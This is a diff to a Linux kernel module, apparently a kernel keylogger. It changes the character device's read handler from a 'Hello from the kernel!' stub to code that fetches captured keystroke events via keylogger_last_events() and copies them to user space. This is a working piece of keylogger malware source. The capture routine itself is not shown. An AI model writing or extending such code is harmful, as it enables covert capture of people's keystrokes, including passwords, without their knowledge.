@@ -3,6 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/device.h>
 #include <linux/fs.h>
+#include <linux/slab.h>
 #include <asm/uaccess.h>
 
 #include "logging.h"
@@ -162,29 +163,38 @@ static int qlog_open(struct inode* inode, struct file* file) {
  * a negative error code will be returned.
  */
 static ssize_t qlog_read(struct file* file, char* buf, size_t len, loff_t* off) {
-    const char message[] = "Hello from the kernel!";
-    const size_t messageLen = sizeof(message);
-    unsigned long errorCount = 0;
+    char* kbuf;
+    unsigned long error;
 
-    LOG_INFO("qlog_read\n");
+    // Allocate a temporary buffer
+    kbuf = kmalloc(len, GFP_KERNEL);
+    if (!kbuf) {
+        return -EFAULT;
+    }
 
-    if (len < messageLen) {
-        return 0;
+    // Read from the keylogger
+    if (keylogger_last_events(kbuf, len) != 0) {
+        // Be sure to clean up.
+        kfree(kbuf);
+        return -EFAULT;
     }
 
     // Copy the message to user mode
-    errorCount = copy_to_user(
+    error = copy_to_user(
         buf,       // 'To' address in user mode
-        message,   // 'From' address in kernel mode
-        messageLen // Number of bytes to copy
+        kbuf,      // 'From' address in kernel mode
+        len        // Number of bytes to copy
     );
+
+    // Free the temporary working buffer
+    kfree(kbuf);
 
     // If any bytes could not be copied return an error, otherwise
     // return the length of the message.
-    if (errorCount) {
+    if (error) {
         return -EFAULT;
     } else {
-        return messageLen;
+        return len;
     }
 }
 
